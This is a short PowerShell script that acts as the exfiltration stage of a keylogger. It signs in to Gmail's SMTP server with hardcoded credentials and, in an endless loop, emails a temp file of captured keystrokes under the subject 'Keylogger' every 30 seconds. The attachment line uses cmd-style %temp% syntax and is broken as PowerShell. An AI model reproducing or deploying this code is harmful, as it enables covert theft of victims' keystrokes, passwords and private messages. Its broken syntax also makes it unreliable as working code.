$yourMail = 'bob@test.com'
$yourPass = 'dragonHunter'

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($yourMail, $yourPass)
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = $yourMail
$ReportEmail.To.Add($yourMail)
$ReportEmail.Subject = 'Keylogger'
while(1)
{
	$ReportEmail.Attachments.Add(%temp%\key.txt)
	$SMTPInfo.Send($ReportEmail)
	sleep 30
}
